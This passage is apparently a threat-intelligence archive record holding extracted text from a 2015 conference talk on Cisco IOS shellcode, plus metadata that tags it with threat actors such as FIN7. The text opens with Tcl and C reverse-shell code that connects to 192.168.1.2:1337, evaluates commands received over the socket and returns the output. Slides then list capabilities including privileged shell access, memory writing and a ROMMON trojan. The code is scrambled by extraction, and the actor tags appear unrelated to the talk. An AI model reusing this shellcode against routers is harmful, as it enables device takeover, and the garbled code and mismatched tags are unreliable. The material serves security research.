=  set sockid [ socket \"192.168.1.2\" 1337] find_Tcl_command(subsys->init_address, 1MB, \"exec\", \n Tcl_CreateCommand); while {1}  if(tcl_exec != NULL){  {\n Tcl_CreateCommand(interp, \"exec\", tcl_exec, 0, 0); flush $sockid } set line  [gets $sockid] Tcl_CreateCommand(interp, \"wmem\", wmem, 0, 0); catch {eval $line} cmdres const char* script =  puts $sockid $cmdres #include \"./tcl/stage2.tcl\" }  ; Tcl_Eval(interp, script); close $sockid . . . }\n\n\n-----\n\n###### CISCO IOS SHELLCODE: ALL-IN-ONE\n\n Features / Properties / Limitations\n\n Features ProperEes\n • We have a shell with the highest level of privileges • Image-independent\n\n • We can work with file system and sockets • It’s easy to port to other CPU architecture\n • We can read/write memory: • Approach can be applied to Cisco IOS XE\n\n • to change behavior of Cisco IOS • No need to worry about a watchdog\n\n • to analyze IOMEM • Hijack a process\n\n Advanced Features LimitaEons\n\n • Macro Command (e.g. create GRE tunnel) • Tcl is not everywhere\n • AutomaEon of aUacks • The relaEvely large size (2KB – 2.5KB)\n\n • Reuse other TCl tools • We can not create a Tcl server\n\n • ROMMON Trojan • It uses an open channel (TCP connecEon)\n\n\n-----\n\n###### CISCO IOS SHELLCODE: ALL-IN-ONE\n\n## Demo 0x02\n\n\n-----\n\n###### CISCO IOS SHELLCODE: ALL-IN-ONE\n\n Conclusion\n\n\n-----\n\n###### CISCO IOS SHELLCODE: ALL-IN-ONE\n\n## The End\n\n###### www.dsec.ru gnosenko@dsec.ru\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "99fdc3ef-333d-48f5-a4a1-becd788c7b80",
            "created_at": "2022-10-25T15:28:29.802983Z",
            "updated_at": "2022-10-25T15:28:29.802983Z",
            "deleted_at": null,
            "name": "MITRE",
            "url": "https://github.com/mitre-attack/attack-stix-data",
            "description": "MITRE ATT&CK STIX Data",
            "reports": null
        }
    ],
    "references": [
        "http://2015.zeronights.org/assets/files/05-Nosenko.pdf"
    ],
    "report_names": [
        "05-Nosenko.pdf"
    ],
    "threat_actors": [
        {
            "id": "f4f16213-7a22-4527-aecb-b964c64c2c46",
            "created_at": "2024-06-19T02:03:08.090932Z",
            "updated_at": "2025-03-27T02:05:17.387119Z",
            "deleted_at": null,
            "main_name": "GOLD NIAGARA",
            "aliases": [
                "Carbanak",
                "Carbon Spider ",
                "FIN7 ",
                "Navigator ",
                "Sangria Tempest ",
                "TelePort Crew ",
                "Calcium "
            ],
            "source_name": "Secureworks:GOLD NIAGARA",
            "tools": [
                " Carbanak",
                " Cobalt Strike",
                " DICELOADER",
                " DRIFTPIN",
                " GGLDR",
                " GRIFFON",
                " JSSLoader",
                " Meterpreter",
                " OFFTRACK",
                " PILLOWMINT",
                " POWERTRASH",
                " SUPERSOFT",
                " TAKEOUT",
                " TinyMet",
                "Bateleur"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "d85adfe3-e1c3-40b0-b8bb-d1bacadc4d82",
            "created_at": "2022-10-25T16:07:23.619566Z",
            "updated_at": "2025-03-27T02:02:09.890982Z",
            "deleted_at": null,
            "main_name": "FIN7",
            "aliases": [
                "APT-C-11",
                "ATK 32",
                "Gold Niagara",
                "ITG14",
                "TAG-CR1"
            ],
            "source_name": "ETDA:FIN7",
            "tools": [
                "7Logger",
                "Agentemis",
                "Anunak",
                "Astra",
                "BIOLOAD",
                "BIRDWATCH",
                "Bateleur",
                "Boostwrite",
                "CROWVIEW",
                "Carbanak",
                "Cobalt Strike",
                "CobaltStrike",
                "DICELOADER",
                "DNSMessenger",
                "FOWLGAZE",
                "HALFBAKED",
                "JSSLoader",
                "KillACK",
                "LOADOUT",
                "Lizar",
                "Meterpreter",
                "Mimikatz",
                "POWERPLANT",
                "POWERSOURCE",
                "RDFSNIFFER",
                "SQLRAT",
                "Sekur",
                "Sekur RAT",
                "TEXTMATE",
                "Tirion",
                "VB Flash",
                "cobeacon"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "f9806b99-e392-46f1-9c13-885e376b239f",
            "created_at": "2023-01-06T13:46:39.431871Z",
            "updated_at": "2025-03-27T02:00:03.08926Z",
            "deleted_at": null,
            "main_name": "Watchdog",
            "aliases": [
                "Thief Libra"
            ],
            "source_name": "MISPGALAXY:Watchdog",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        }
    ],
    "ts_created_at": 1666716492,
    "ts_updated_at": 1743041819,
    "ts_creation_date": 1449235426,
    "ts_modification_date": 1449235426,
    "files": {
        "pdf": "https://archive.orkl.eu/85606536882806ab2d4a1a487a70cbcb976d8fcf.pdf",
        "text": "https://archive.orkl.eu/85606536882806ab2d4a1a487a70cbcb976d8fcf.txt",
        "img": "https://archive.orkl.eu/85606536882806ab2d4a1a487a70cbcb976d8fcf.jpg"
    }
}